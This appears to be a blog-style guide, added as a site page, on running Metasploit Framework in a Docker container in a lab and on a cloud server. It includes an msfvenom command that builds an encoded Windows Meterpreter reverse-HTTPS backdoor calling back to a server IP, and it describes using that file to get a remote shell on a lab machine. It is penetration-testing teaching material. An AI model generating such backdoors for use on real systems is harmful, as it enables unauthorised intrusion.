@@ -1,0 +1,90 @@
+:page-title: Run Metasploit Framework as a Docker Container
+:page-author: Jiffy
+:page-avatar: devlopr.png
+:page-image: containers.jpg
+:page-category: guides
+:page-tags: [ ops ]
+:page-excerpt: Run Metasploit Framework as a Docker Container Without Installation Pains
+
+== Run Metasploit Framework as a Docker Container Without Installation Pains
+
+Metasploit Framework is a powerful open source tool for penetration testing. Whether you’re looking to use it for work or are merely interested in experimenting with it, you can run Metasploit Framework in a Docker container without having to deal with the pain of installing the code and its dependencies. The Docker image “remnux/metasploit” is available as part of the REMnux collection, thanks to the configuration efforts of Jean Christophe Baptiste.
+
+The following instructions and examples demonstrate how you can start using this Metasploit Docker container in a lab as well as on a publicly-accessible server. The container provides the command-line Metasploit Framework version of the tool. It lacks the web-based interface that you can get if you install the free Community edition, which you would need to register with Rapid 7. Command-line capabilities of Metasploit Framework are very powerful and lend themselves well to penetration testing tasks that involve running the tool on a remote system.
+
+== How to Launch the Metasploit Framework Docker Container
+
+To make use of the Metasploit Framework Docker image, all you need is a sufficiently-powerful system that is connected to the Internet and that has Docker installed on it. When you run a command like the one below on such a host, it will automatically download the image from the REMnux repository and launch it:
+
+----
+sudo docker run --rm -it -p 443:443 -v ~/.msf4:/root/.msf4 -v /tmp/msf:/tmp/data remnux/metasploit
+----
+
+In this example, I directed Docker to run the application “remnux/metasploit” in a transient container, which will disappear once you’ve exited it (that’s what “–rm” is for). The “-it” parameter allows you to interact with the container using an interactive shell.
+
+To ensure that relevant data persists across container invocations, I used the “-v” parameter to map the directories on my host to the corresponding locations inside the container. The idea is to use the “~/.msf4” directory for Metasploit Framework configuration files. The “/tmp/msf” directory on the host can store other data you may wish to keep, such as the artifacts you might obtain from the targeted systems.
+
+The “-p” parameter maps the ports on which you expect to receive inbound connections to the corresponding ports inside the container. The example above uses TCP port 443 with the expectation of incoming HTTPS connections from reverse shells.
+
+The image is quite large: over 1.2GB in size, because it includes the full runtime environment for Metasploit Framework, along with all its dependencies. It will be cached locally after the initial download. If you ever wish to refresh the image to ensure you’re using the latest version use the command “sudo docker pull remnux/metasploit”.
+
+The container is configured to automatically update Metasploit modules whenever you launch it. To add your own modules, add them to your host’s ~/.msf4 directory.
+
+== Test-Driving the Metasploit Framework Container
+
+Here’s how you might start experimenting with Metasploit Framework after launching its “remnux/metasploit” container in your lab. I’ll target a weakly-configured Windows system in my lab for example purposes. I’ll direct Metasploit Framework to remotely connect to the system using the credentials that I supplied, rather than actually exploiting a vulnerability. I will then open a reverse HTTPS shell to my Metasploit Framework console.
+
+In the sample session above, I launched Metasploit’s msfconsole tool, then directed it to give me an interactive Meterpreter shell to the targeted system. The connection was tunneled over HTTPS, which was directed to the Metasploit Framework container over TCP port 443.
+
+The screenshot that I saved using this session was placed in the /tmp/data directory inside the container. When I exited the container, the contents of that directory persisted on my underlying host in the /tmp/msf directory.
+
+== Running the Metasploit Framework Container in the Public Cloud
+
+When performing penetration testing, you’ll probably want to run Metasploit on an Internet-accessible system. You can do this quite easily by bringing up a temporary server within some public cloud provider, then running the Metasploit Framework container on that host.
+
+For instance, here is how you can accomplish this using DigitalOcean, which I like to use due to its low cost and high reliability. (The link includes my referral code.) Though DigitalOcean can spin up virtual machines for merely $5 per month, I found such a low-end system to have insufficient RAM for Metasploit. Therefore, I went with the $10 per month option for an Ubuntu host.
+
+Once the new system is active, you can log into it and execute the following commands to install Docker on the host:
+
+----
+apt-key adv --keyserver hkp://p80.pool.sks-keyservers.net:80 --recv-keys 58118E89F3A912897C070ADBF76221572C52609D
+add-apt-repository -y "deb https://apt.dockerproject.org/repo ubuntu-$(lsb_release -sc) main"
+apt-get update
+apt-get -y dist-upgrade
+apt-get -y install docker-engine
+----
+
+Afterwards, you can direct Docker to download and launch the Metasploit Framework container using the command like the one in the beginning of this article.
+
+----
+sudo docker run --rm -it -p 443:443 -v ~/.msf4:/root/.msf4 -v /tmp/msf:/tmp/data remnux/metasploit
+----
+
+For this example, I decided to use Metasploit to generate a standalone backdoor executable file, which I would run on the targeted Windows system to simulate a scenario where the victim is tricked into running malware. I ran the “msfvenom” tool inside the Metasploit Framework container to accomplish this:
+
+----
+msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_https LHOST=104.236.213.164 LPORT=443 -e x86/shikata_ga_nai -f exe -o file.exe
+----
+
+Since the current directory inside the container is /tmp/data by default, the resulting file was placed there. Because I mapped this directory to the host’s /tmp/msf directory, I was able to take it from there and transfer it to my lab’s Windows computer.
+
+I then ran “msfconsole” inside the container and directed the tool to use multi/handler, which is designed to accept connections generated outside of the “msfconsole” interface. Once the reverse-HTTPS listener was active, I “infected” my Windows system with the previously-created file.exe, which completed the connection and provided me with a Meterpreter shell.
+
+As was the case in the previous example, I saved the screenshot of the Windows system into /tmp/data, which allowed me to retain it even after the container terminated.
+
+== Additional Capabilities of the Container
+The Metasploit Framework container also includes the infamous Nmap scanning tool, which you can run using the “nmap” command. It offers a powerful way to examine networks and systems to locate potentially-vulnerable services and to determine where to focus your Metasploit efforts. The container also includes the NASM disassembler.
+
+In addition the container includes the tmux terminal multiplexer utility. It allows you to launch multiple “virtual” windows inside a single terminal window. The container’s configuration for this tool maps Ctrl+a as the command key, instead of the default Ctrl+b. To make use of it, type “tmux” after launching the Metasploit Framework container. This will give you a shell inside one of the tool’s “virtual” window. To open another one, press Ctrl+a followed by “c”. To switch between the windows, type Ctrl+a followed by that window’s number (e.g., Ctrl+a followed by “0” or “1”).
+
+For example, you could use tmux to run nmap in one window and msfconsole in another. You can read a tutorial on using tmux to get started with this tool.
+
+
+== Wrapping It Up
+Docker containers offer a convenient way of running Metasploit Framework without having to deal with the installation of the tool’s code and its dependencies. Running Metasploit this way is especially handy for situations where you wish to quickly deploy it to a new system, such as one running in a public cloud, and then tear it down without losing your customizations or data. On the other hand, this approach requires some familiarity with Docker containers.
+
+Thanks to Jean Christophe Baptiste for creating and maintaining the Dockerfile and associated configuration files upon which the “remnux/metasploit” image is based. If you notice any problems with this container or have suggestions for improving it, please log an issue on the REMnux repository for Docker files.
+
+== Web links
+
+* link:https://zeltser.com/metasploit-framework-docker-container/
